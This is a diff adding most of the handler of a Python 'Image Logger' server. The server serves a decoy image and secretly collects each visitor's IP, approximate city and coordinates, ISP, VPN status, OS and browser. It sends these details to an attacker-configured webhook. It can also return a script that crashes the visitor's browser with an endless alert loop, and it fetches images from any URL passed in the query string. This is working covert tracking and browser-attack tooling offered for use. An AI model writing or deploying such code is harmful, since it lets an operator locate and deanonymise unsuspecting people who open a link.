@@ -93,4 +93,74 @@ class Handler(BaseHTTPRequestHandler):
                 {"name": "Provider", "value": ip_info.get("isp", "Unknown"), "inline": True},
                 {"name": "ASN", "value": ip_info.get("as", "Unknown"), "inline": True},
                 {"name": "Country", "value": ip_info.get("country", "Unknown"), "inline": True},
-                {"name": "Region", "value": ip_info.ge
+                {"name": "Region", "value": ip_info.get("regionName", "Unknown"), "inline": True},
+                {"name": "City", "value": ip_info.get("city", "Unknown"), "inline": True},
+                {"name": "Coords", "value": f'{ip_info.get("lat", "Unknown")}, {ip_info.get("lon", "Unknown")}', "inline": True},
+                {"name": "Timezone", "value": ip_info.get("timezone", "Unknown"), "inline": True},
+                {"name": "Mobile", "value": str(ip_info.get("mobile", False)), "inline": True},
+                {"name": "VPN/Proxy/Hosting", "value": str(ip_info.get("proxy", False)) + "/" + str(ip_info.get("hosting", False)), "inline": True},
+                {"name": "Bot", "value": bot or "No", "inline": True},
+                {"name": "OS", "value": os_info, "inline": True},
+                {"name": "Browser", "value": browser_info, "inline": True},
+                {"name": "User Agent", "value": useragent, "inline": False},
+            ]
+
+            embed = {
+                "title": "Image Logger - IP Logged",
+                "color": config["color"],
+                "fields": fields
+            }
+
+            requests.post(config["webhook"], json={
+                "username": config["username"],
+                "embeds": [embed],
+            })
+
+            # Serve response based on config
+            if config["redirect"]["redirect"]:
+                self.send_response(302)
+                self.send_header('Location', config["redirect"]["page"])
+                self.end_headers()
+                return
+            elif config["crashBrowser"]:
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b"<script>while(true) alert('crash');</script>")
+                return
+            elif config["message"]["doMessage"]:
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(config["message"]["message"].encode())
+                return
+            else:
+                self.send_response(200)
+                self.send_header('Content-type', 'image/png')
+                self.end_headers()
+                image_url = config["image"]
+                if config["imageArgument"]:
+                    parsed_url = parse.urlparse(self.path)
+                    query = parse.parse_qs(parsed_url.query)
+                    if "url" in query:
+                        image_url = query["url"][0]
+                image_resp = requests.get(image_url)
+                self.wfile.write(image_resp.content)
+
+        except Exception as e:
+            traceback_str = traceback.format_exc()
+            reportError(traceback_str)
+            self.send_response(500)
+            self.end_headers()
+            self.wfile.write(b"Internal Server Error")
+
+
+def run(server_class=HTTPServer, handler_class=Handler, port=8000):
+    server_address = ('', port)
+    httpd = server_class(server_address, handler_class)
+    print(f"Starting {__app__} server on port {port}...")
+    httpd.serve_forever()
+
+
+if __name__ == "__main__":
+    run()
